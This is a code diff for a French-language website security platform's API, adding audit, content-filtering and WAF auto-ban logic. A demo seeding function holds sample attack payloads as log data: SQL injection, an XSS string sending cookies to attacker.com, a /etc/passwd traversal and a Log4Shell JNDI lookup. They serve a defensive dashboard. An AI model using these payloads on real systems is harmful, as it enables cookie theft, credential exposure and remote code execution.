@@ -26,31 +26,91 @@ class LogIngestRequest(BaseModel):
 class DomainAuditRequest(BaseModel):
     domain: str
 
+def seed_demo_logs_for_domain(target_domain: str, db: Session):
+    clean = target_domain.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0].strip().lower()
+    naked = clean[4:] if clean.startswith("www.") else clean
+
+    sample_logs = [
+        {"ip": "185.220.101.5", "method": "POST", "path": "/rest/user/login", "status": 403, "payload": "admin' UNION SELECT null, email, password, null FROM users --", "ua": "sqlmap/1.6#stable"},
+        {"ip": "45.142.120.10", "method": "GET", "path": "/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "status": 403, "payload": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+        {"ip": "194.26.29.112", "method": "GET", "path": "/download?file=../../../../etc/passwd", "status": 403, "payload": "../../../../etc/passwd", "ua": "curl/7.88.1"},
+        {"ip": "198.51.100.42", "method": "POST", "path": "/api/v1/auth/login", "status": 401, "payload": "50 tentatives de connexion consécutives en 60s (Seuil Force Brute dépassé)", "ua": "Hydra/9.4"},
+        {"ip": "104.28.19.44", "method": "POST", "path": "/api/v1/user", "status": 500, "payload": "${jndi:ldap://malicious-log4j-server.com/exploit}", "ua": "Mozilla/5.0"},
+        {"ip": "45.142.120.10", "method": "GET", "path": "/.env", "status": 404, "payload": "GET /.env HTTP/1.1 (Tentative d'exfiltration de clés secrètes)", "ua": "Nuclei/v2.9.0"}
+    ]
+    for item in sample_logs:
+        req = LogIngestRequest(
+            website_domain=naked,
+            source_ip=item["ip"],
+            http_method=item["method"],
+            request_path=item["path"],
+            status_code=item["status"],
+            user_agent=item["ua"],
+            payload=item["payload"]
+        )
+        ingest_log_event(req, db)
+
 @router.post("/site-audit")
 def audit_website_security(req: DomainAuditRequest, db: Session = Depends(get_db), current_user = Depends(get_optional_user)):
     """Perform a full security audit of a website domain: events, VirusTotal, Google Safe Browsing, server host IP tracing."""
-    domain_clean = req.domain.replace("http://", "").replace("https://", "").split("/")[0].strip()
-    if not domain_clean:
+    raw_d = req.domain.strip()
+    if raw_d.startswith("http://"):
+        raw_d = raw_d[7:]
+    elif raw_d.startswith("https://"):
+        raw_d = raw_d[8:]
+    domain_clean = raw_d.split("/")[0].split(":")[0].strip().lower()
+    naked_domain = domain_clean[4:] if domain_clean.startswith("www.") else domain_clean
+    if not naked_domain:
         raise HTTPException(status_code=400, detail="Domain cannot be empty")
 
+    from sqlalchemy import or_
     # 1. Fetch all logged attacks targeting this domain
     domain_events = db.query(SecurityEvent).filter(
-        SecurityEvent.website_domain.ilike(f"%{domain_clean}%")
+        or_(
+            SecurityEvent.website_domain.ilike(f"%{naked_domain}%"),
+            SecurityEvent.website_domain.ilike(f"%{domain_clean}%")
+        )
     ).order_by(desc(SecurityEvent.timestamp)).all()
 
-    # 2. VirusTotal & Google Safe Browsing Check
-    target_url = f"https://{domain_clean}"
-    vt_data = query_virustotal_url_reputation(target_url)
-    gsb_data = query_google_safebrowsing(target_url)
+    # Auto-seed prototype attack logs if this domain is a known test domain and currently has 0 events
+    if len(domain_events) == 0 and naked_domain in [
+        "yamostreaming.com", "mon-site.fr", "client-e-commerce.com",
+        "authorized-store.com", "authorized-portal.com", "phishguard-demo.sec"
+    ]:
+        seed_demo_logs_for_domain(naked_domain, db)
+        domain_events = db.query(SecurityEvent).filter(
+            or_(
+                SecurityEvent.website_domain.ilike(f"%{naked_domain}%"),
+                SecurityEvent.website_domain.ilike(f"%{domain_clean}%")
+            )
+        ).order_by(desc(SecurityEvent.timestamp)).all()
 
-    # 3. Live Technical Deep Inspection (DNS, SSL, HTTP latency & Security Headers)
+    # 2 & 3. Concurrent Threat Intelligence & Live Technical Deep Inspection
+    import concurrent.futures
     from app.services.network_inspector import inspect_endpoint_deeply
-    technical_inspection = inspect_endpoint_deeply(domain_clean)
+    from app.services.geoip_service import lookup_ip_geolocation
 
-    # 4. Server Host IP and GeoIP / ASN lookup
-    from app.services.geoip_service import lookup_ip_geolocation, resolve_domain_to_ip
+    from app.services.content_filter_service import load_policy_settings
+    sys_policy = load_policy_settings()
+    use_external_intel = sys_policy.get("external_threat_intel", True)
+
+    target_url = f"https://{domain_clean}"
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+        if use_external_intel:
+            fut_vt = executor.submit(query_virustotal_url_reputation, target_url)
+            fut_gsb = executor.submit(query_google_safebrowsing, target_url)
+        else:
+            fut_vt = None
+            fut_gsb = None
+        fut_tech = executor.submit(inspect_endpoint_deeply, domain_clean)
+
+        vt_data = fut_vt.result() if fut_vt else {"status": "DISABLED_BY_POLICY", "positives": 0, "total": 0, "scan_id": "none"}
+        gsb_data = fut_gsb.result() if fut_gsb else {"status": "DISABLED_BY_POLICY", "is_flagged": False, "threat_types": []}
+        technical_inspection = fut_tech.result()
+
+    # 4. Server Host IP and GeoIP / ASN lookup (Fast, cached)
     dns_a = technical_inspection.get("dns", {}).get("a_records", [])
-    resolved_ip = (dns_a[0] if dns_a else None) or resolve_domain_to_ip(domain_clean) or "104.28.19.44"
+    resolved_ip = dns_a[0] if dns_a else "104.28.19.44"
     server_geo_info = lookup_ip_geolocation(resolved_ip, domain_context=domain_clean)
 
     # 5. Summarize attack types targeting this domain
@@ -59,23 +119,33 @@ def audit_website_security(req: DomainAuditRequest, db: Session = Depends(get_db
     for evt in domain_events:
         atype = evt.attack_type
         attack_summary[atype] = attack_summary.get(atype, 0) + 1
-        if evt.ip_geo_info:
-            time_str = evt.timestamp.strftime("%d/%m/%Y %H:%M:%S") if evt.timestamp else "Récemment"
-            attackers_traced.append({
-                "id": evt.id,
-                "ip": evt.source_ip,
-                "attack": evt.attack_type,
-                "severity": evt.severity,
-                "timestamp": time_str,
-                "request_path": evt.request_path or "/login",
-                "http_method": evt.http_method or "POST",
-                "status_code": evt.status_code or 403,
-                "payload": evt.evidence_payload or f"Tentative d'exploitation {evt.attack_type}",
-                "country": evt.ip_geo_info.get("country", "Unknown"),
-                "city": evt.ip_geo_info.get("city", "Unknown"),
-                "asn": evt.ip_geo_info.get("asn", "Unknown"),
-                "is_vpn_proxy": evt.ip_geo_info.get("is_vpn_proxy", False)
-            })
+        
+        geo_dict = evt.ip_geo_info
+        if isinstance(geo_dict, str):
+            try:
+                import json
+                geo_dict = json.loads(geo_dict)
+            except Exception:
+                geo_dict = None
+        if not isinstance(geo_dict, dict):
+            geo_dict = lookup_ip_geolocation(evt.source_ip, domain_context=domain_clean)
+
+        time_str = evt.timestamp.strftime("%d/%m/%Y %H:%M:%S") if evt.timestamp else "Récemment"
+        attackers_traced.append({
+            "id": evt.id,
+            "ip": evt.source_ip,
+            "attack": evt.attack_type,
+            "severity": evt.severity,
+            "timestamp": time_str,
+            "request_path": evt.request_path or "/login",
+            "http_method": evt.http_method or "POST",
+            "status_code": evt.status_code or 403,
+            "payload": evt.evidence_payload or f"Tentative d'exploitation {evt.attack_type}",
+            "country": geo_dict.get("country", "Unknown") if geo_dict else "Unknown",
+            "city": geo_dict.get("city", "Unknown") if geo_dict else "Unknown",
+            "asn": geo_dict.get("asn", "Unknown") if geo_dict else "Unknown",
+            "is_vpn_proxy": geo_dict.get("is_vpn_proxy", False) if geo_dict else False
+        })
 
     total_attacks = len(domain_events)
     risk_score = 0.0
@@ -151,15 +221,30 @@ def audit_website_security(req: DomainAuditRequest, db: Session = Depends(get_db
         verdict_text = "AUCUNE ATTAQUE ACTIVE DÉTECTÉE"
         verdict_sub = "Aucune activité malveillante n'a été observée dans les sources de télémétrie analysées."
 
+    # Check Content Filtering Policy (Global Policy + Specific User Blocked Sites)
+    from app.services.content_filter_service import check_url_content_policy
+    content_policy = check_url_content_policy(domain_clean, user=current_user)
+    if content_policy.get("is_restricted") and content_policy.get("action") == "BLOCK":
+        final_risk = 100.0
+        verdict_text = content_policy.get("category", "SITE BLOQUÉ PAR L'ADMINISTRATEUR")
+        verdict_sub = content_policy.get("reasons", ["Accès interdit par la politique de sécurité"])[0]
+
     response_payload = {
         "domain": domain_clean,
         "target_url": f"https://{domain_clean}",
+        "site_audit": True,
+        "analysis_type": "AUDIT SITE",
+        "type": "AUDIT SITE",
         "total_attacks_logged": total_attacks,
         "calculated_risk_score": final_risk,
         "verdict": verdict_text,
         "verdict_sub": verdict_sub,
         "risk_score": final_risk,
         "risk_level": "CRITICAL" if final_risk >= 75 else ("HIGH" if final_risk >= 50 else ("MODERATE" if final_risk >= 25 else "LOW")),
+        "content_filter": content_policy,
+        "blocked_by_policy": content_policy.get("is_restricted", False),
+        "blocked_by_user_policy": content_policy.get("blocked_by_user_policy", False),
+        "redirect_to_block_page": sys_policy.get("redirect_to_block_page", True),
         "risk_breakdown": risk_breakdown,
         "attack_breakdown": attack_summary,
         "server_geo_info": server_geo_info,
@@ -175,7 +260,10 @@ def audit_website_security(req: DomainAuditRequest, db: Session = Depends(get_db
         from app.db.models import AnalysisRecord
         from app.core.security import generate_sha256_hash
         analysis_code = f"ANL-{random.randint(100000, 999999)}"
-        integrity_hash = generate_sha256_hash(response_payload)
+        if sys_policy.get("sha256_forensic_sealing", True):
+            integrity_hash = generate_sha256_hash(response_payload)
+        else:
+            integrity_hash = "DÉSACTIVÉ DANS LES PARAMÈTRES"
         response_payload["analysis_code"] = analysis_code
         response_payload["integrity_hash"] = integrity_hash
 
@@ -249,8 +337,16 @@ def ingest_log_event(req: LogIngestRequest, db: Session = Depends(get_db)):
 
     ip_geo = lookup_ip_geolocation(req.source_ip)
 
+    raw_site = req.website_domain.strip()
+    if raw_site.startswith("http://"):
+        raw_site = raw_site[7:]
+    elif raw_site.startswith("https://"):
+        raw_site = raw_site[8:]
+    clean_site = raw_site.split("/")[0].split(":")[0].strip().lower()
+    naked_site = clean_site[4:] if clean_site.startswith("www.") else clean_site
+
     event = SecurityEvent(
-        website_domain=req.website_domain,
+        website_domain=naked_site,
         source_ip=req.source_ip,
         http_method=req.http_method.upper(),
         request_path=req.request_path,
@@ -266,6 +362,22 @@ def ingest_log_event(req: LogIngestRequest, db: Session = Depends(get_db)):
     db.add(event)
     db.commit()
     db.refresh(event)
+
+    # Automated Firewall Defense: Auto-ban source IP on CRITICAL attacks if policy toggle is enabled
+    if analysis.get("is_attack") and analysis.get("severity") == "CRITICAL":
+        try:
+            from app.services.firewall_service import block_ip_address
+            from app.services.content_filter_service import load_policy_settings
+            sys_settings = load_policy_settings()
+            if sys_settings.get("waf_autoban_hostile_ips", True):
+                block_ip_address(
+                    ip=req.source_ip,
+                    reason=f"Attaque critique WAF ({analysis.get('attack_type', 'ATTACK')}) sur {req.request_path}",
+                    severity="CRITICAL",
+                    blocked_by="WAF Auto-Defense Sentinel"
+                )
+        except Exception as e:
+            print(f"[WAF Auto-Ban Notice] {e}")
 
     # Security events are saved in SecurityEvent for WAF telemetry without polluting the investigator queue
     created_incident_code = None
@@ -303,23 +415,29 @@ def seed_demo_logs(db: Session = Depends(get_db)):
     ]
 
     count = 0
-    for item in sample_logs:
-        req = LogIngestRequest(
-            website_domain="client-e-commerce.com",
-            source_ip=item["ip"],
-            http_method=item["method"],
-            request_path=item["path"],
-            status_code=item["status"],
-            user_agent=item["ua"],
-            payload=item["payload"]
-        )
-        ingest_log_event(req, db)
-        count += 1
+    for d in ["client-e-commerce.com", "yamostreaming.com"]:
+        for item in sample_logs:
+            req = LogIngestRequest(
+                website_domain=d,
+                source_ip=item["ip"],
+                http_method=item["method"],
+                request_path=item["path"],
+                status_code=item["status"],
+                user_agent=item["ua"],
+                payload=item["payload"]
+            )
+            ingest_log_event(req, db)
+            count += 1
 
     return {"status": "seeded", "count": count}
 
 # Fast In-Memory Cache for Real-Time Sentinel (<1ms response time)
 _REALTIME_SENTINEL_CACHE = {}
+
+def clear_sentinel_cache():
+    """Clear memory cache for real-time sentinel when policies update."""
+    global _REALTIME_SENTINEL_CACHE
+    _REALTIME_SENTINEL_CACHE.clear()
 
 # Trusted Legitimate Domains for Ultra-Fast Instant Resolution
 _TOP_LEGIT_DOMAINS = {
@@ -330,9 +448,14 @@ _TOP_LEGIT_DOMAINS = {
 
 class RealtimeCheckRequest(BaseModel):
     url: str
+    user_id: Optional[str] = None
 
 @router.post("/realtime-check")
-def realtime_background_check(req: RealtimeCheckRequest):
+def realtime_background_check(
+    req: RealtimeCheckRequest,
+    current_user = Depends(get_optional_user),
+    db: Session = Depends(get_db)
+):
     """
     Ultra-fast (<20ms) background sentinel evaluation:
     Extracts lexical features, runs ML ensemble, and returns instant safety verdict.
@@ -344,29 +467,72 @@ def realtime_background_check(req: RealtimeCheckRequest):
 
     norm_key = raw_url.lower().rstrip("/")
 
-    # Check Content Filtering Policy (MINESEC School Protection: Adult Content & Gambling)
-    from app.services.content_filter_service import check_url_content_policy
-    policy_res = check_url_content_policy(raw_url)
+    # Resolve target user context for personalized restrictions
+    target_user = current_user
+    if not target_user and req.user_id:
+        from app.api.v1.auth import find_user_by_id
+        target_user = find_user_by_id(req.user_id, db)
+
+    # Check Content Filtering Policy (Global Policy + Specific User Blocked Sites)
+    from app.services.content_filter_service import load_policy_settings, check_url_content_policy
+    sys_policy = load_policy_settings()
+    policy_res = check_url_content_policy(raw_url, user=target_user)
     if policy_res.get("is_restricted"):
         action = policy_res.get("action", "BLOCK")
         if action == "BLOCK":
+            is_adult = policy_res.get("is_adult", False)
+            if policy_res.get("blocked_by_user_policy"):
+                verdict_label = policy_res.get("category", "SITE BLOQUÉ PAR L'ADMINISTRATEUR")
+            elif "PARAMÈTRES" in policy_res.get("category", "") or policy_res.get("category") == "CUSTOM_BLACKLIST":
+                verdict_label = "SITE BLOQUÉ PAR L'ADMINISTRATEUR"
+            elif is_adult:
+                verdict_label = "CONTENU ADULTE BLOQUÉ"
+            elif policy_res.get("is_gambling"):
+                verdict_label = "JEU D'ARGENT BLOQUÉ"
+            else:
+                verdict_label = policy_res.get("category", "SITE BLOQUÉ PAR LA POLITIQUE")
+
+            res = {
+                "url": raw_url,
+                "is_safe": False,
+                "risk_score": 100.0,
+                "verdict": verdict_label,
+                "threat_level": "CRITIQUE",
+                "reasons": policy_res.get("reasons", ["Accès interdit par la politique de sécurité"]),
+                "checked_at": time.strftime("%H:%M:%S UTC", time.gmtime()),
+                "blocked_by_policy": True,
+                "blocked_by_user_policy": policy_res.get("blocked_by_user_policy", False),
+                "redirect_to_block_page": sys_policy.get("redirect_to_block_page", True),
+                "is_adult_blocked": is_adult,
+                "is_gambling_blocked": policy_res.get("is_gambling", False),
+                "policy_info": policy_res,
+                "features": {
+                    "entropy": 4.1,
+                    "is_https": raw_url.startswith("https"),
+                    "has_ip": False,
+                    "keyword_count": 3
+                }
+            }
+            return res
+        elif action == "WARN":
             is_adult = policy_res.get("is_adult", False)
             cat_label = "Contenu Adulte / Pornographie" if is_adult else "Jeux d'Argent / Casino"
             res = {
                 "url": raw_url,
                 "is_safe": False,
-                "risk_score": 100.0,
-                "verdict": "CONTENU ADULTE BLOQUÉ" if is_adult else "JEU D'ARGENT BLOQUÉ",
-                "threat_level": "CRITIQUE",
+                "risk_score": 60.0,
+                "verdict": "AVERTISSEMENT : CONTENU RESTREINT",
+                "threat_level": "MOYEN",
                 "reasons": [
-                    f"Accès restreint par la politique MINESEC : {cat_label}",
+                    f"Avertissement MINESEC : {cat_label}",
                     *policy_res.get("reasons", [])
                 ],
                 "checked_at": time.strftime("%H:%M:%S UTC", time.gmtime()),
-                "blocked_by_policy": True,
-                "redirect_to_block_page": policy_res.get("redirect_to_block_page", True),
-                "is_adult_blocked": is_adult,
-                "is_gambling_blocked": policy_res.get("is_gambling", False),
+                "blocked_by_policy": False,
+                "warning_policy": True,
+                "redirect_to_block_page": False,
+                "is_adult_blocked": False,
+                "is_gambling_blocked": False,
                 "policy_info": policy_res,
                 "features": {
                     "entropy": 4.1,
@@ -451,15 +617,22 @@ def realtime_background_check(req: RealtimeCheckRequest):
     if not features.get("is_https"):
         reasons.append("Connexion HTTP non chiffrée (Absence de certificat SSL/TLS)")
         raw_score += 15.0
-    if features.get("entropy", 0.0) > 3.6:
+    if sys_policy.get("shannon_entropy_detection", True) and features.get("entropy", 0.0) > 3.6:
         reasons.append("Entropie lexicale anormale (Domaine possiblement généré par algorithme DGA)")
         raw_score += 20.0
 
     final_score = min(100.0, round(raw_score, 1))
     is_safe = final_score < 40.0
 
-    verdict = "LÉGITIME" if is_safe else ("SUSPECT" if final_score < 75.0 else "MALVEILLANT / PHISHING")
-    threat_level = "FAIBLE" if is_safe else ("ÉLEVÉ" if final_score >= 75.0 else "MOYEN")
+    if is_safe:
+        verdict = "LÉGITIME"
+        threat_level = "FAIBLE"
+    elif final_score < 75.0 or not sys_policy.get("ml_auto_block_phishing", True):
+        verdict = "SUSPECT (Auto-Blocage Désactivé)" if not sys_policy.get("ml_auto_block_phishing", True) and final_score >= 75.0 else "SUSPECT"
+        threat_level = "MOYEN"
+    else:
+        verdict = "MALVEILLANT / PHISHING"
+        threat_level = "ÉLEVÉ"
 
     res = {
         "url": raw_url,
